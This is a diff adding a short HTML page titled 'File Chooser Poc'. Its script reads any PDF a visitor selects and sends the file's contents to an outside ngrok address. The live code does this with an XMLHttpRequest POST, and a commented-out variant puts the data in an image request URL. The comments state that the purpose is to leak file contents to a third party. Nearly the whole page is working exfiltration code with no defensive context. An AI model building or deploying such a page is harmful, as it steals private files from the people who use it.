@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>File Chooser Poc</title>
+</head>
+
+<body>
+
+  <h1>File Chooser</h1>
+  <input type="file" accept="application/pdf" onchange="blobCallback(window.URL.createObjectURL(this.files[0]))">
+
+
+
+  <script type="text/javascript">
+
+
+    // function blobCallback(blobUrl) {
+
+    //   theftFile(blobUrl, function (contents) {
+    //     // Leak file contents to a third-party URL
+    //     new Image().src = "https://4c15-122-180-180-86.ngrok.io/?data=" + encodeURIComponent(contents);
+    //   });
+
+    // }
+
+    function blobCallback(blobUrl) {
+
+      theftFile(blobUrl, function (contents) {
+        // Leak file contents to a third-party URL
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://4c15-122-180-180-86.ngrok.io/");
+
+        xhr.setRequestHeader("Accept", "application/*");
+        xhr.setRequestHeader("Content-Type", "application/*");
+
+        xhr.onload = () => console.log(xhr.responseText);
+
+        let data = contents;
+
+        xhr.send(data);
+      });
+    }
+
+
+    function theftFile(url, callback) {
+      var req = new XMLHttpRequest();
+
+      req.open("GET", url, true);
+      req.onload = function (e) {
+        callback(req.responseText);
+        //callback(url);
+      }
+      req.onerror = function (e) {
+        callback("error");
+      }
+      req.send();
+    }
+  </script>
+
+</body>
+
+</html>
